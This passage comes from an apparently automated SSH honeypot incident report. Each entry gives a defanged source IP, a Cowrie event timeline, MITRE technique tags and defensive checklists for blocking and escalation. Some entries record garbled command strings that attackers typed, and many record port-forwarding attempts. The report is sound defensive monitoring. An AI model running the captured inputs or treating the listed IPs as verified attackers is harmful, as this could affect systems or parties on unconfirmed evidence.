- [ ] Block `189.244.61[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd4620616676

| Field | Detail |
|---|---|
| **Source IP** | `189.244.61[.]51` |
| **First Seen** | 2026-08-29 15:35 |
| **Last Seen** | 2026-08-29 15:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 15:35:36` | `cowrie.session.connect` |
| `2026-08-29 15:35:36` | `cowrie.client.version` |
| `2026-08-29 15:35:36` | `cowrie.client.kex` |
| `2026-08-29 15:35:36` | `cowrie.login.success` |
| `2026-08-29 15:35:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.244.61[.]51` to AbuseIPDB if not already reported
- [ ] Block `189.244.61[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a2d153eacc5

| Field | Detail |
|---|---|
| **Source IP** | `14.33.48[.]192` |
| **First Seen** | 2026-08-29 15:35 |
| **Last Seen** | 2026-08-29 15:36 |
| **Session Duration** | 33s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `zalee, za, &k`g&k|zpkfq)ES[M, g & k | zpkfq` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 15:35:47` | `cowrie.session.connect` |
| `2026-08-29 15:35:48` | `cowrie.login.success` |
| `2026-08-29 15:35:49` | `cowrie.login.success` |
| `2026-08-29 15:35:49` | `cowrie.session.params` |
| `2026-08-29 15:35:50` | `cowrie.command.input` |
| `2026-08-29 15:35:50` | `cowrie.command.failed` |
| `2026-08-29 15:35:50` | `cowrie.command.input` |
| `2026-08-29 15:35:50` | `cowrie.command.failed` |
| `2026-08-29 15:35:51` | `cowrie.command.input` |
| `2026-08-29 15:35:51` | `cowrie.command.input` |
| `2026-08-29 15:35:51` | `cowrie.command.failed` |
| `2026-08-29 15:35:51` | `cowrie.command.failed` |
| `2026-08-29 15:36:21` | `cowrie.log.closed` |
| `2026-08-29 15:36:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.33.48[.]192` to AbuseIPDB if not already reported
- [ ] Block `14.33.48[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d3f393abcbc

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 15:35 |
| **Last Seen** | 2026-08-29 15:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 15:35:52` | `cowrie.session.connect` |
| `2026-08-29 15:35:52` | `cowrie.client.version` |
| `2026-08-29 15:35:52` | `cowrie.client.kex` |
| `2026-08-29 15:35:53` | `cowrie.login.success` |
| `2026-08-29 15:35:53` | `cowrie.direct-tcpip.request` |
| `2026-08-29 15:35:53` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 15:35:53` | `cowrie.direct-tcpip.data` |
| `2026-08-29 15:35:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1798e8dae2bb

| Field | Detail |
|---|---|
| **Source IP** | `14.33.48[.]192` |
| **First Seen** | 2026-08-29 15:36 |
| **Last Seen** | 2026-08-29 15:36 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 15:36:21` | `cowrie.session.connect` |
| `2026-08-29 15:36:22` | `cowrie.login.success` |
| `2026-08-29 15:36:23` | `cowrie.session.params` |
| `2026-08-29 15:36:23` | `cowrie.command.input` |
| `2026-08-29 15:36:23` | `cowrie.command.failed` |
| `2026-08-29 15:36:23` | `cowrie.command.input` |
| `2026-08-29 15:36:23` | `cowrie.command.failed` |
| `2026-08-29 15:36:24` | `cowrie.command.input` |
| `2026-08-29 15:36:24` | `cowrie.command.failed` |
| `2026-08-29 15:36:24` | `cowrie.command.input` |
| `2026-08-29 15:36:24` | `cowrie.command.failed` |
| `2026-08-29 15:36:25` | `cowrie.command.input` |
| `2026-08-29 15:36:25` | `cowrie.command.input` |
| `2026-08-29 15:36:25` | `cowrie.command.failed` |
| `2026-08-29 15:36:25` | `cowrie.command.failed` |
| `2026-08-29 15:36:55` | `cowrie.log.closed` |
| `2026-08-29 15:36:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.33.48[.]192` to AbuseIPDB if not already reported
- [ ] Block `14.33.48[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-335caa35d9a0

| Field | Detail |
|---|---|
| **Source IP** | `2.179.194[.]193` |
| **First Seen** | 2026-08-29 15:36 |
| **Last Seen** | 2026-08-29 15:36 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 15:36:22` | `cowrie.session.connect` |
| `2026-08-29 15:36:22` | `cowrie.client.version` |
| `2026-08-29 15:36:22` | `cowrie.client.kex` |
| `2026-08-29 15:36:24` | `cowrie.login.success` |
| `2026-08-29 15:36:24` | `cowrie.direct-tcpip.request` |
| `2026-08-29 15:36:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.179.194[.]193` to AbuseIPDB if not already reported
- [ ] Block `2.179.194[.]193` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e28695157ad

| Field | Detail |
|---|---|
| **Source IP** | `37.57.158[.]182` |
| **First Seen** | 2026-08-29 15:36 |
| **Last Seen** | 2026-08-29 15:36 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 15:36:29` | `cowrie.session.connect` |
| `2026-08-29 15:36:29` | `cowrie.client.version` |
| `2026-08-29 15:36:29` | `cowrie.client.kex` |
| `2026-08-29 15:36:31` | `cowrie.login.success` |
| `2026-08-29 15:36:31` | `cowrie.direct-tcpip.request` |
| `2026-08-29 15:36:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.57.158[.]182` to AbuseIPDB if not already reported
- [ ] Block `37.57.158[.]182` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b2b2fd4ed83

| Field | Detail |
|---|---|
| **Source IP** | `14.33.48[.]192` |
| **First Seen** | 2026-08-29 15:36 |
| **Last Seen** | 2026-08-29 15:37 |
| **Session Duration** | 33s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `zalee, za, &k`g&k|zpkfq)ES[M, g & k | zpkfq` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 15:36:55` | `cowrie.session.connect` |
| `2026-08-29 15:36:56` | `cowrie.login.success` |
| `2026-08-29 15:36:57` | `cowrie.login.success` |
| `2026-08-29 15:36:57` | `cowrie.session.params` |
| `2026-08-29 15:36:58` | `cowrie.command.input` |
| `2026-08-29 15:36:58` | `cowrie.command.failed` |
| `2026-08-29 15:36:58` | `cowrie.command.input` |
| `2026-08-29 15:36:58` | `cowrie.command.failed` |
| `2026-08-29 15:36:59` | `cowrie.command.input` |
| `2026-08-29 15:36:59` | `cowrie.command.input` |
| `2026-08-29 15:36:59` | `cowrie.command.failed` |
| `2026-08-29 15:36:59` | `cowrie.command.failed` |
| `2026-08-29 15:37:29` | `cowrie.log.closed` |
| `2026-08-29 15:37:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.33.48[.]192` to AbuseIPDB if not already reported
- [ ] Block `14.33.48[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c6606767378

| Field | Detail |
|---|---|
| **Source IP** | `14.33.48[.]192` |
| **First Seen** | 2026-08-29 15:37 |
| **Last Seen** | 2026-08-29 15:38 |
| **Session Duration** | 33s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `zalee, za, &k`g&k|zpkfq)ES[M, g & k | zpkfq` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 15:37:29` | `cowrie.session.connect` |
| `2026-08-29 15:37:30` | `cowrie.login.success` |
| `2026-08-29 15:37:31` | `cowrie.login.success` |
| `2026-08-29 15:37:31` | `cowrie.session.params` |
| `2026-08-29 15:37:32` | `cowrie.command.input` |
| `2026-08-29 15:37:32` | `cowrie.command.failed` |
| `2026-08-29 15:37:32` | `cowrie.command.input` |
| `2026-08-29 15:37:32` | `cowrie.command.failed` |
| `2026-08-29 15:37:33` | `cowrie.command.input` |
| `2026-08-29 15:37:33` | `cowrie.command.input` |
| `2026-08-29 15:37:33` | `cowrie.command.failed` |
| `2026-08-29 15:37:33` | `cowrie.command.failed` |
| `2026-08-29 15:38:03` | `cowrie.log.closed` |
| `2026-08-29 15:38:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.33.48[.]192` to AbuseIPDB if not already reported
- [ ] Block `14.33.48[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9458f1ff8f01

| Field | Detail |
|---|---|
| **Source IP** | `14.33.48[.]192` |
| **First Seen** | 2026-08-29 15:38 |
| **Last Seen** | 2026-08-29 15:38 |
| **Session Duration** | 34s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `zalee, za, &k`g&k|zpkfq)ES[M, g & k | zpkfq` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 15:38:03` | `cowrie.session.connect` |
| `2026-08-29 15:38:04` | `cowrie.login.success` |
| `2026-08-29 15:38:05` | `cowrie.login.success` |
| `2026-08-29 15:38:05` | `cowrie.session.params` |
| `2026-08-29 15:38:06` | `cowrie.command.input` |
| `2026-08-29 15:38:06` | `cowrie.command.failed` |
| `2026-08-29 15:38:06` | `cowrie.command.input` |
| `2026-08-29 15:38:06` | `cowrie.command.failed` |
| `2026-08-29 15:38:07` | `cowrie.command.input` |
| `2026-08-29 15:38:07` | `cowrie.command.input` |
| `2026-08-29 15:38:07` | `cowrie.command.failed` |
| `2026-08-29 15:38:07` | `cowrie.command.failed` |
| `2026-08-29 15:38:38` | `cowrie.log.closed` |
| `2026-08-29 15:38:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.33.48[.]192` to AbuseIPDB if not already reported
- [ ] Block `14.33.48[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27ccbfd06f70

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 15:38 |
| **Last Seen** | 2026-08-29 15:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 15:38:34` | `cowrie.session.connect` |
| `2026-08-29 15:38:34` | `cowrie.client.version` |
| `2026-08-29 15:38:35` | `cowrie.client.kex` |
| `2026-08-29 15:38:35` | `cowrie.login.success` |
| `2026-08-29 15:38:36` | `cowrie.direct-tcpip.request` |
| `2026-08-29 15:38:36` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 15:38:36` | `cowrie.direct-tcpip.data` |
| `2026-08-29 15:38:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f11f61037e5

| Field | Detail |
|---|---|
| **Source IP** | `14.33.48[.]192` |
| **First Seen** | 2026-08-29 15:38 |
| **Last Seen** | 2026-08-29 15:39 |
| **Session Duration** | 34s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `zalee, za, &k`g&k|zpkfq)ES[M, g & k | zpkfq` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 15:38:38` | `cowrie.session.connect` |
| `2026-08-29 15:38:39` | `cowrie.login.success` |
| `2026-08-29 15:38:40` | `cowrie.login.success` |
| `2026-08-29 15:38:40` | `cowrie.session.params` |
| `2026-08-29 15:38:41` | `cowrie.command.input` |
| `2026-08-29 15:38:41` | `cowrie.command.failed` |
| `2026-08-29 15:38:41` | `cowrie.command.input` |
| `2026-08-29 15:38:41` | `cowrie.command.failed` |
| `2026-08-29 15:38:42` | `cowrie.command.input` |
| `2026-08-29 15:38:42` | `cowrie.command.input` |
| `2026-08-29 15:38:42` | `cowrie.command.failed` |
| `2026-08-29 15:38:42` | `cowrie.command.failed` |
| `2026-08-29 15:39:13` | `cowrie.log.closed` |
| `2026-08-29 15:39:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.33.48[.]192` to AbuseIPDB if not already reported
- [ ] Block `14.33.48[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6522142f728b

| Field | Detail |
|---|---|
| **Source IP** | `14.33.48[.]192` |
| **First Seen** | 2026-08-29 15:39 |
| **Last Seen** | 2026-08-29 15:39 |
| **Session Duration** | 34s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 15:39:13` | `cowrie.session.connect` |
| `2026-08-29 15:39:14` | `cowrie.login.success` |
| `2026-08-29 15:39:15` | `cowrie.session.params` |
| `2026-08-29 15:39:15` | `cowrie.command.input` |
| `2026-08-29 15:39:15` | `cowrie.command.failed` |
| `2026-08-29 15:39:16` | `cowrie.command.input` |
| `2026-08-29 15:39:16` | `cowrie.command.failed` |
| `2026-08-29 15:39:16` | `cowrie.command.input` |
| `2026-08-29 15:39:16` | `cowrie.command.failed` |
| `2026-08-29 15:39:17` | `cowrie.command.input` |
| `2026-08-29 15:39:17` | `cowrie.command.failed` |
| `2026-08-29 15:39:17` | `cowrie.command.input` |
| `2026-08-29 15:39:17` | `cowrie.command.input` |
| `2026-08-29 15:39:17` | `cowrie.command.failed` |
| `2026-08-29 15:39:17` | `cowrie.command.failed` |
| `2026-08-29 15:39:48` | `cowrie.log.closed` |
| `2026-08-29 15:39:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.33.48[.]192` to AbuseIPDB if not already reported
- [ ] Block `14.33.48[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08b308b6e95d

| Field | Detail |
|---|---|
| **Source IP** | `88.249.10[.]161` |
| **First Seen** | 2026-08-29 15:39 |
| **Last Seen** | 2026-08-29 15:39 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 15:39:46` | `cowrie.session.connect` |
| `2026-08-29 15:39:47` | `cowrie.client.version` |
| `2026-08-29 15:39:47` | `cowrie.client.kex` |
| `2026-08-29 15:39:48` | `cowrie.login.success` |
| `2026-08-29 15:39:49` | `cowrie.direct-tcpip.request` |
| `2026-08-29 15:39:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `88.249.10[.]161` to AbuseIPDB if not already reported
- [ ] Block `88.249.10[.]161` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84f641a26932

| Field | Detail |
|---|---|
| **Source IP** | `14.33.48[.]192` |
| **First Seen** | 2026-08-29 15:39 |
| **Last Seen** | 2026-08-29 15:40 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 15:39:48` | `cowrie.session.connect` |
| `2026-08-29 15:39:49` | `cowrie.login.success` |
| `2026-08-29 15:39:49` | `cowrie.session.params` |
| `2026-08-29 15:39:50` | `cowrie.command.input` |
| `2026-08-29 15:39:50` | `cowrie.command.failed` |
| `2026-08-29 15:39:50` | `cowrie.command.input` |
| `2026-08-29 15:39:50` | `cowrie.command.failed` |
| `2026-08-29 15:39:51` | `cowrie.command.input` |
| `2026-08-29 15:39:51` | `cowrie.command.failed` |
| `2026-08-29 15:39:51` | `cowrie.command.input` |
| `2026-08-29 15:39:51` | `cowrie.command.failed` |
| `2026-08-29 15:39:51` | `cowrie.command.input` |
| `2026-08-29 15:39:51` | `cowrie.command.input` |
| `2026-08-29 15:39:51` | `cowrie.command.failed` |
| `2026-08-29 15:39:51` | `cowrie.command.failed` |
| `2026-08-29 15:40:22` | `cowrie.log.closed` |
| `2026-08-29 15:40:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.33.48[.]192` to AbuseIPDB if not already reported
- [ ] Block `14.33.48[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e463abe5cb56

| Field | Detail |
|---|---|
| **Source IP** | `65.20.141[.]202` |
| **First Seen** | 2026-08-29 15:39 |
| **Last Seen** | 2026-08-29 15:40 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 15:39:54` | `cowrie.session.connect` |
| `2026-08-29 15:39:54` | `cowrie.client.version` |
| `2026-08-29 15:39:54` | `cowrie.client.kex` |
| `2026-08-29 15:39:56` | `cowrie.login.success` |
| `2026-08-29 15:39:56` | `cowrie.direct-tcpip.request` |
| `2026-08-29 15:40:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.141[.]202` to AbuseIPDB if not already reported
- [ ] Block `65.20.141[.]202` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68e5bc0a80aa

| Field | Detail |
|---|---|
| **Source IP** | `66.179.137[.]169` |
| **First Seen** | 2026-08-29 15:42 |
| **Last Seen** | 2026-08-29 15:42 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 15:42:38` | `cowrie.session.connect` |
| `2026-08-29 15:42:39` | `cowrie.client.version` |
| `2026-08-29 15:42:39` | `cowrie.client.kex` |
| `2026-08-29 15:42:40` | `cowrie.login.success` |
| `2026-08-29 15:42:40` | `cowrie.direct-tcpip.request` |
| `2026-08-29 15:42:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `66.179.137[.]169` to AbuseIPDB if not already reported
- [ ] Block `66.179.137[.]169` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba2aa0430b58

| Field | Detail |
|---|---|
| **Source IP** | `222.76.248[.]54` |
| **First Seen** | 2026-08-29 15:42 |
| **Last Seen** | 2026-08-29 15:43 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 15:42:58` | `cowrie.session.connect` |
| `2026-08-29 15:43:00` | `cowrie.client.version` |
| `2026-08-29 15:43:00` | `cowrie.client.kex` |
| `2026-08-29 15:43:04` | `cowrie.login.success` |
| `2026-08-29 15:43:06` | `cowrie.direct-tcpip.request` |
| `2026-08-29 15:43:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.76.248[.]54` to AbuseIPDB if not already reported
- [ ] Block `222.76.248[.]54` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ab1391710e5

| Field | Detail |
|---|---|
| **Source IP** | `59.22.68[.]213` |
| **First Seen** | 2026-08-29 15:44 |
| **Last Seen** | 2026-08-29 15:44 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 15:44:38` | `cowrie.session.connect` |
| `2026-08-29 15:44:39` | `cowrie.client.version` |
| `2026-08-29 15:44:39` | `cowrie.client.kex` |
| `2026-08-29 15:44:41` | `cowrie.login.success` |
| `2026-08-29 15:44:42` | `cowrie.direct-tcpip.request` |
| `2026-08-29 15:44:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.22.68[.]213` to AbuseIPDB if not already reported
- [ ] Block `59.22.68[.]213` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64e2380301cd

| Field | Detail |
|---|---|
| **Source IP** | `49.124.153[.]50` |
| **First Seen** | 2026-08-29 15:44 |
| **Last Seen** | 2026-08-29 15:44 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 15:44:49` | `cowrie.session.connect` |
| `2026-08-29 15:44:49` | `cowrie.client.version` |
| `2026-08-29 15:44:49` | `cowrie.client.kex` |
| `2026-08-29 15:44:52` | `cowrie.login.success` |
| `2026-08-29 15:44:52` | `cowrie.direct-tcpip.request` |
| `2026-08-29 15:44:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.153[.]50` to AbuseIPDB if not already reported
- [ ] Block `49.124.153[.]50` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba96952728ab

| Field | Detail |
|---|---|
| **Source IP** | `213.209.159[.]230` |
| **First Seen** | 2026-08-29 15:44 |
| **Last Seen** | 2026-08-29 15:45 |
| **Session Duration** | 30s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 15:44:50` | `cowrie.session.connect` |
| `2026-08-29 15:44:50` | `cowrie.client.version` |
| `2026-08-29 15:44:50` | `cowrie.client.kex` |
| `2026-08-29 15:44:50` | `cowrie.login.success` |
| `2026-08-29 15:44:51` | `cowrie.direct-tcpip.request` |
| `2026-08-29 15:44:51` | `cowrie.direct-tcpip.ja4` |
| `2026-08-29 15:44:51` | `cowrie.direct-tcpip.data` |
| `2026-08-29 15:45:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.209.159[.]230` to AbuseIPDB if not already reported
- [ ] Block `213.209.159[.]230` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-499731e830fa

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 15:45 |
| **Last Seen** | 2026-08-29 15:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 15:45:10` | `cowrie.session.connect` |
| `2026-08-29 15:45:10` | `cowrie.client.version` |
| `2026-08-29 15:45:10` | `cowrie.client.kex` |
| `2026-08-29 15:45:11` | `cowrie.login.success` |
| `2026-08-29 15:45:11` | `cowrie.direct-tcpip.request` |
| `2026-08-29 15:45:12` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 15:45:12` | `cowrie.direct-tcpip.data` |
| `2026-08-29 15:45:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3579e97c96d5

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 15:49 |
| **Last Seen** | 2026-08-29 15:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 15:49:26` | `cowrie.session.connect` |
| `2026-08-29 15:49:26` | `cowrie.client.version` |
| `2026-08-29 15:49:26` | `cowrie.client.kex` |
| `2026-08-29 15:49:27` | `cowrie.login.success` |
| `2026-08-29 15:49:27` | `cowrie.direct-tcpip.request` |
| `2026-08-29 15:49:27` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 15:49:27` | `cowrie.direct-tcpip.data` |
| `2026-08-29 15:49:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5252bffc19b

| Field | Detail |
|---|---|
| **Source IP** | `36.111.146[.]165` |
